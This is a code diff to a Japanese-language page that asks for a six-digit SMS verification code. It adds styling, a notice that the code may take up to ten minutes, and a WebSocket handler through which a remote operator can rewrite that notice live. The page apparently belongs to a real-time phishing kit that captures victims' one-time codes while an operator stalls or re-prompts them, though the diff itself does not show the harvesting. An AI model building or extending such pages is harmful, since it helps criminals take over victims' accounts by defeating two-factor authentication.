@@ -33,6 +33,7 @@
 
         .logo {
             margin-bottom: 40px;
+            text-align: center;
         }
 
         .logo svg {
@@ -56,7 +57,18 @@
             font-size: 14px;
             color: #333;
             line-height: 1.6;
+            margin-bottom: 10px;
+        }
+
+        .template-text {
+            font-size: 11px;
+            color: #666;
+            line-height: 1.5;
             margin-bottom: 30px;
+            padding: 10px;
+            background-color: #f9f9f9;
+            border-radius: 4px;
+            border-left: 3px solid #bf0000;
         }
 
         .form-group {
@@ -224,6 +236,12 @@
 
             .description {
                 font-size: 13px;
+                margin-bottom: 8px;
+            }
+
+            .template-text {
+                font-size: 10px;
+                padding: 8px;
                 margin-bottom: 25px;
             }
 
@@ -264,6 +282,10 @@
 
         <div class="description">
             登録された携帯電話番号に送信された6桁の認証コードを入力してください。
+        </div>
+
+        <div class="template-text" id="templateText">
+            ※送信まで最大10分かかる場合がございます。
         </div>
 
         <form id="twoFAForm">
@@ -358,6 +380,11 @@
                 document.getElementById('twoFACode').value = '';
                 document.getElementById('twoFACode').disabled = false;
                 document.getElementById('twoFACode').focus();
+            });
+
+            socket.on('update_template', (data) => {
+                console.log('[WebSocket] テンプレート更新:', data.template);
+                document.getElementById('templateText').textContent = data.template;
             });
             
             const codeInput = document.getElementById('twoFACode');
